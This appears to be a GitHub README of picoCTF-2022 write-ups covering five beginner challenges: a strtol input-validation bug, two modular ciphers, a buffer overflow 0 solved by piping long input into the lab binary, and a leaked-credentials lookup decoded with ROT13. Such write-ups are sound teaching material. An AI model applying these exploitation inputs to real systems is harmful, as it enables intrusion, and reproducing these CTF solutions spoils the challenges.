
# picoCTF-2022
### Hi there, and Welcome to my picoCTF-2022 progress and writeups

**Total Chalennges : 65**
✔️Solved: 51
❌Unsolved : 14 
(completed 72.5%)

**Team rank: 677 from 7794 (Top 8%)**

![image](https://user-images.githubusercontent.com/62214984/163713181-4492b90e-03a6-476b-a968-f44da82bb5ed.png)

## The provided here flags are not genuine PicoCTF flags

<details>
  <summary><h2> 1. basic-file-exploit | 100 points ✔️ </h2></summary>
  <h3>Description:</h3>
	The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! <br/>
	<s>Connect to the program with netcat:</s><br/> 
	<s>$ nc saturn.picoctf.net 49000</s><br/>
	"<i>Use <a href=https://github.com/LogicBypass/CTF-s/raw/main/picoCTF-2022/1.basic-file-exploit/1.basic-file-exploit.out><code>1.basic-file-exploit.out</code></a> instead</i>"<br/>
	The program's source code with the flag redacted can be downloaded <a href=https://github.com/LogicBypass/CTF-s/blob/main/picoCTF-2022/1.basic-file-exploit/1.basic-file-exploit.c>here.</a> <br/>
	<br/>
  
  > Hint: Try passing in things the program doesn't expect. Like a string instead of a number.
  ----
  <h3>Reconnaissance:</h3>
	Download the files: <code>wget link-to-file</code><br/> 
	Make it exacutable:<code>chmod +x *</code><br/>
	Open the program's source code file and analyze the flag retrieving function:<br/>
<pre>
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
	puts(flag);
	fseek(stdin, 0, SEEK_END);
	exit(0);
}
</pre>
	<br/>
	Now we need to manipulate the input to get the function result == 0 </br>
  <hr>
  <h3>Exploitation:</h3>
	At the first run, let's try to use it as intended</br>
<pre>
└─$ ./1.basic-file-exploit.out
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
Please enter your data:
Logic Bypass
Please enter the length of your data:
12
Your entry number is: 1
Write successful, would you like to do anything else?
2
Please enter the entry number of your data:
1
Logic Bypass
Read successful, would you like to do anything else?
Timed out waiting for user input. Press Ctrl-C to disconnect
Goodbye!
</pre>
<br/>
	Now let's try to insert "0" into different fields:<br/>
	First try:
<pre>
└─$ ./1.basic-file-exploit.out
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
Please enter your data:
0
Please enter the length of your data:
0
Please put in a valid length		#Not allowed to insert 0
Please enter the length of your data:
1
Your entry number is: 1
Write successful, would you like to do anything else?
2                                                      #Read our entry
Please enter the entry number of your data:
1
0
Read successful, would you like to do anything else?

Timed out waiting for user input. Press Ctrl-C to disconnect
Goodbye!
</pre>
<br/>
	Nothing interesting</br>
	Second try, the valid input but try to read the "0" entry number
<pre>
└─$ ./1.basic-file-exploit.out
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
Please enter your data:
Logic Bypass
Please enter the length of your data:
12
Your entry number is: 1
Write successful, would you like to do anything else?
2                                                      #Switch to Read entry
Please enter the entry number of your data:
0
picoCTF{#########################}
</pre>
Hooray! We have a flag!
<br/>
We also can get the flag by "Trying passing strings instead of number" as mentioned in "Hint"<br/>
This works because of "strtol() function error" that says: In case no conversion was performed (no digits seen, and 0 returned)
<pre>
└─$ ./1.basic-file-exploit.out
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
Please enter your data:
Logic Bypass
Please enter the length of your data:
12
Your entry number is: 1
Write successful, would you like to do anything else?
2                                                      #Switch to Read entry
Please enter the entry number of your data:
A
picoCTF{#########################}
</pre>
Hooray! We have a flag!
</details>

---

<details>
  <summary><h2> 2. basic-mod1 | 100 points ✔️ </h2></summary>
  <h3>Description:</h3>
	We found this weird message being passed around on the servers, we think we have a working decryption scheme.<br/>
	<br/>
	Message:<br/> 
	<i> 202 137 390 235 114 369 198 110 350 396 390 383 225 258 38 291 75 324 401 142 288 397 </i><br/>
	<br/>
	Take each number mod 37 and map it to the following character set:<br/>
	0-25 is the alphabet (uppercase)<br/>
	26-35 are the decimal digits<br/>
	36 is an underscore<br/>
	Wrap your decrypted message in the picoCTF flag format<br/>
	<br/>
  
  > Hint1: Do you know what mod 37 means?
	
  > Hint2: mod 37 means modulo 37. It gives the remainder of a number after being divided by 37.

  ----
  <h3>Reconnaissance and Exploitation:</h3>
	Go to <a href="https://www.dcode.fr/cipher-identifier">Chipher Identifier</a> to find a Modulo Cipher decoder.<br/>
	Open <a href="https://www.dcode.fr/modulo-cipher">Modulo Cipher</a> from results, change modulo nr to 37 and insert the Message.<br/>
	Take the output and using <a href="https://www.dcode.fr/substitution-cipher">Substitution Cipher</a> and map it to the character set from the description:<br/>
	<pre>
	0-25 is the alphabet (uppercase).
	26-35 are the decimal digits.
	36 is an underscore.</pre>
	Wrap your decrypted message in the picoCTF flag format<br/>

	picoCTF{R****_N_*0***_********}
Hooray! We have a flag!
</details>

---

<details>
  <summary><h2> 3. basic-mod2 | 100 points ✔️ </h2></summary>
  <h3>Description:</h3>
  A new modular challenge!<br/>
  Message:<br/> 
  <i> 186 249 356 395 303 337 190 393 146 174 446 127 385 400 420 226 76 294 144 90 291 445 137 </i><br/>
	<br/>
  Take each number mod 41 and find the modular inverse for the result. Then map to the following character set:<br/>
  1-26 are the alphabet<br/>
  27-36 are the decimal digits<br/>
  37 is an underscore<br/>
	<br/>
  Wrap your decrypted message in the picoCTF flag format (i.e. picoCTF{decrypted_message})<br/>
  <br/>
    
  > Hint1: Do you know what the modular inverse is?<br/>
  > Hint2: The inverse modulo z of x is the number, y that when multiplied by x is 1 modulo z.<br/>
  > Hint3: It's recommended to use a tool to find the modular inverses.<br/>


  ----
  <h3>Exploitation:</h3>
  
  Go to <a href="https://www.dcode.fr/cipher-identifier">Chipher Identifier</a> to find a Modular Inverse decoder.<br/>
  Open <a href="https://www.dcode.fr/modular-inverse">Modular Inverse</a> from results, change modulo nr to 41 and insert the Message one by one.<br/>
  Take the output and using <a href="https://www.dcode.fr/substitution-cipher">Substitution Cipher</a> and map it to the character set from the description:<br/>

    <pre>
    0-25 is the alphabet (uppercase).
    26-35 are the decimal digits.
    36 is an underscore.</pre>
  Wrap your decrypted message in the picoCTF flag format<br/>

    picoCTF{1*V3R*3L*_H4*D_B7*B9*79}
Hooray! We have a flag!
</details>

---

<details>
  <summary><h2> 4. buffer overflow 0 | 100 points ✔️ </h2></summary>
  <h3>Description:</h3>
  Smash the stack<br/>
  Let's start off simple, can you overflow the correct buffer?<br/> 
	<br/>
  The program is available <a href=https://github.com/LogicBypass/CTF-s/raw/main/picoCTF-2022/4.buffer-overflow-0/vuln>here.</a> <br/>
  You can view source <a href=https://github.com/LogicBypass/CTF-s/raw/main/picoCTF-2022/4.buffer-overflow-0/vuln.c>here.</a> .<br/>
<br/>

    
  > Hint1: How can you trigger the flag to print?<br/>
  > Hint2: If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.<br/>
  > Hint3: Run <code>man gets</code> and read the BUGS section. How many characters can the program really read?<br/>


  ----
  <h3>Reconnaissance:</h3>
  Download the files: <code>wget link-to-file</code><br/> 
  Make it exacutable:<code>chmod +x *</code><br/>
  Open the program's source code file and analyze it<br/>
  Run <code>man gets</code> and read the BUGS section.<br/>


  <h3>Exploitation:</h3>
  Option 1:<br/>
    <code>python -c 'from pwn import *;print(cyclic(60))' | ./vuln </code><br/>
  Option 2:<br/>
    <code>python -c 'print ("a"*100)' | ./vuln </code><br/>
  Option 3:<br/>
  <i>Python not always works as buffer overflow input, so it's a good habbit to have an alternative:</i><br/>
    <code>(echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"; cat) | ./vuln </code><br/>
<br/>
  <code>picoCTF{************}</code><br/>
Hooray! We have a flag!<br/>
</details>

---

<details>
  <summary><h2> 5.credstuff ✔️ </h2></summary>
  <h3>Description:</h3>
  	We found a leak of a blackmarket website's login credentials. Can you find the password of the user <code>cultiris</code> and successfully decrypt it?
	<br/>
	Download the leak  <a href=https://artifacts.picoctf.net/c/534/leak.tar>here.</a> <br/>
	<br/>
    The first user in <code>usernames.txt</code> corresponds to the first password in <code>passwords.txt</code>. The second user corresponds to the second password, and so on.<br/>
    <br/>
    
  
  > Hint: Maybe other passwords will have hints about the leak?


  ----
  <h3>Reconnaissance & Exploitation:</h3>
	Download the file: <code>wget link-to-file</code><br/> 
	Extract it :<code>tar -xf file</code><br/>
	Search for <code>cultiris</code> and it's line number in <code>usernames.txt</code><br/>
    <br/>
	<pre>
	cat usernames.txt | grep "cultiris" -n
	Output:
	>>> 378:cultiris
	</pre>
	<br/>
	Now we need to search for this line in <code>passwords.txt</code> file. </br>
	<pre>
    sed '378!d' passwords.txt
	Output:
	>>> cvpbPGS{P7e1S_54I35_71Z3}
	</pre>
	<br/>
    Decode with ROT13 and get the flag:
    <code>picoCTF{C*r**_5***5_7*M*}</code>
 
</details>

---

 Checkmarks:
✔️
❌


